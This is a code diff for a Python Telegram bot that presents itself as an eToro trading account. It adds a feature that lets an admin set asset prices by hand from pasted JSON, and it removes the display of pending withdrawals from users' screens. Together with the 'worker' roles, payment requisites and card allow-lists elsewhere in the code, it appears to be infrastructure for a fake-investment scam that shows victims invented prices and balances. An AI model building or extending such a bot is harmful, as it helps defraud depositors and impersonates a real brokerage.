@@ -31,6 +31,7 @@ REQUISITES_FILE = os.path.join(BASE_DIR, "requisites.json")
 PROMOCODES_FILE = os.path.join(BASE_DIR, "promocodes.json")
 ALLOWED_CARDS_FILE = os.path.join(BASE_DIR, "allowed_cards.json")
 PENDING_DEPOSITS_FILE = os.path.join(BASE_DIR, "pending_deposits.json")
+ASSET_PRICES_FILE = os.path.join(BASE_DIR, "asset_prices.json")
 
 # Данные для торговли
 CRYPTO_CURRENCIES = [
@@ -247,6 +248,33 @@ def save_allowed_cards(cards):
 def normalize_card_number(card_number):
     """Нормализует номер карты (удаляет пробелы)"""
     return card_number.replace(" ", "").replace("-", "")
+
+def load_asset_prices():
+    """Загружает цены активов из файла"""
+    global ASSET_PRICES
+    try:
+        if exists(ASSET_PRICES_FILE):
+            with open(ASSET_PRICES_FILE, 'r', encoding='utf-8') as f:
+                loaded_prices = json.load(f)
+                # Объединяем все категории в один словарь
+                new_prices = {}
+                for category in loaded_prices.values():
+                    if isinstance(category, dict):
+                        new_prices.update(category)
+                if new_prices:
+                    ASSET_PRICES.update(new_prices)
+                    logging.info(f"Loaded {len(new_prices)} asset prices from file")
+    except Exception as e:
+        logging.error(f"Ошибка загрузки цен активов: {e}")
+
+def save_asset_prices(prices_data):
+    """Сохраняет цены активов в файл"""
+    try:
+        with open(ASSET_PRICES_FILE, 'w', encoding='utf-8') as f:
+            json.dump(prices_data, f, ensure_ascii=False, indent=4)
+        logging.info("Asset prices saved successfully")
+    except Exception as e:
+        logging.error(f"Ошибка сохранения цен активов: {e}")
 
 def load_pending_deposits():
     """Загружает запросы на пополнение из файла"""
@@ -548,8 +576,7 @@ async def show_user_profile(message: Message):
     
     profile_text = (
         f"👤 <b>eToro • Личный кабинет</b>\n\n"
-        f"💰 <b>Баланс:</b> {user_data['balance']:.2f} ₽\n"
-        f"📤 <b>На выводе:</b> {user_data['pending_withdrawal']:.2f} ₽\n\n"
+        f"💰 <b>Баланс:</b> {user_data['balance']:.2f} ₽\n\n"
         f"📅 <b>На платформе:</b> {user_data['days_on_platform']} дн.\n"
         f"✅ <b>Верификация:</b> {'✅ Верифицирован' if user_data['verified'] else '⚠️ Не верифицирован'}\n"
         f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
@@ -703,8 +730,7 @@ async def handle_withdraw(callback: CallbackQuery):
     
     text = (
         "💰 <b>Вывод средств</b>\n\n"
-        f"💳 Доступно для вывода: {user_data['balance']:.2f} ₽\n"
-        f"📤 На выводе: {user_data.get('pending_withdrawal', 0):.2f} ₽\n\n"
+        f"💳 Доступно для вывода: {user_data['balance']:.2f} ₽\n\n"
         "Выберите способ вывода:"
     )
     
@@ -964,8 +990,9 @@ async def show_admin_panel(message: Message):
     builder.add(types.InlineKeyboardButton(text="💳 Реквизиты", callback_data="admin_requisites"))
     builder.add(types.InlineKeyboardButton(text="📊 Промокоды", callback_data="admin_promocodes"))
     builder.add(types.InlineKeyboardButton(text="💳 Управление картами", callback_data="admin_cards"))
+    builder.add(types.InlineKeyboardButton(text="💹 Обновить цены", callback_data="admin_update_prices"))
     builder.add(types.InlineKeyboardButton(text="📢 Рассылка всем", callback_data="admin_broadcast"))
-    builder.adjust(2, 2, 1)
+    builder.adjust(2, 2, 1, 1)
     
     await message.answer(text, reply_markup=builder.as_markup(), parse_mode=ParseMode.HTML)
 
@@ -1468,6 +1495,61 @@ async def handle_worker_text_input(message: Message):
                 f"Ошибок: {fail_count}"
             )
             del worker_states[worker_id]
+            return
+        
+        elif action == 'update_asset_prices':
+            try:
+                # Парсим JSON
+                prices_json = json.loads(message.text)
+                
+                # Валидация структуры
+                if not isinstance(prices_json, dict):
+                    await message.answer("❌ Неверный формат JSON. Ожидается объект (словарь)")
+                    return
+                
+                # Подсчет количества обновленных цен
+                total_updated = 0
+                
+                # Обновляем глобальную переменную ASSET_PRICES
+                global ASSET_PRICES
+                for category, assets in prices_json.items():
+                    if isinstance(assets, dict):
+                        for asset_name, price in assets.items():
+                            if asset_name in ASSET_PRICES:
+                                ASSET_PRICES[asset_name] = float(price)
+                                total_updated += 1
+                
+                # Сохраняем в файл
+                save_asset_prices(prices_json)
+                
+                await message.answer(
+                    f"✅ <b>Цены активов обновлены!</b>\n\n"
+                    f"📊 Обновлено активов: {total_updated}\n"
+                    f"💾 Данные сохранены в файл",
+                    parse_mode=ParseMode.HTML
+                )
+                
+                logging.info(f"Admin {worker_id} updated {total_updated} asset prices")
+                del worker_states[worker_id]
+                
+            except json.JSONDecodeError as e:
+                await message.answer(
+                    f"❌ <b>Ошибка парсинга JSON!</b>\n\n"
+                    f"Проверьте правильность формата:\n"
+                    f"<code>{str(e)}</code>\n\n"
+                    f"💡 Убедитесь, что:\n"
+                    f"• Все строки в двойных кавычках\n"
+                    f"• Нет лишних запятых\n"
+                    f"• Скобки закрыты правильно",
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception as e:
+                await message.answer(
+                    f"❌ <b>Ошибка обновления цен!</b>\n\n"
+                    f"<code>{str(e)}</code>",
+                    parse_mode=ParseMode.HTML
+                )
+                logging.error(f"Error updating asset prices: {e}")
             return
     
     # Если ничего не подошло - показываем помощь
@@ -2344,6 +2426,38 @@ async def handle_admin_broadcast(callback: CallbackQuery):
     # Перенаправляем на существующий обработчик
     callback.data = "worker_broadcast"
     await handle_worker_broadcast(callback)
+
+@router.callback_query(F.data == "admin_update_prices")
+async def handle_admin_update_prices(callback: CallbackQuery):
+    """Обновление цен активов (только для админов)"""
+    admin_id = callback.from_user.id
+    
+    if admin_id not in authorized_admins:
+        await callback.answer("❌ Доступ запрещен", show_alert=True)
+        return
+    
+    worker_states[admin_id] = {'action': 'update_asset_prices'}
+    
+    text = (
+        "💹 <b>Обновление цен активов</b>\n\n"
+        "Отправьте JSON в следующем формате:\n\n"
+        "<code>{\n"
+        '    "# Криптовалюты (в рублях)": {\n'
+        '        "₿ Bitcoin (BTC)": 8988312.00,\n'
+        '        "Ξ Ethereum (ETH)": 318839.00\n'
+        "    },\n"
+        '    "# Российские акции (в рублях)": {\n'
+        '        "🛢️ Газпром (GAZP)": 137.54\n'
+        "    },\n"
+        '    "# Сырьевые товары (в рублях)": {\n'
+        '        "🥇 Золото (GOLD)": 10787.00\n'
+        "    }\n"
+        "}</code>\n\n"
+        "❗ Все цены должны быть указаны в рублях"
+    )
+    
+    await callback.message.answer(text, parse_mode=ParseMode.HTML)
+    await callback.answer()
 
 @router.callback_query(F.data == "admin_back_main")
 async def handle_admin_back_main(callback: CallbackQuery):
@@ -3386,7 +3500,8 @@ async def main():
         load_promocodes()
         load_allowed_cards()
         load_pending_deposits()
-        logging.info("Данные успешно загружены (пользователи, конфиг, промокоды, карты, запросы на пополнение)")
+        load_asset_prices()
+        logging.info("Данные успешно загружены (пользователи, конфиг, промокоды, карты, запросы на пополнение, цены активов)")
     except Exception as e:
         logging.error(f"Ошибка загрузки данных: {e}")
     
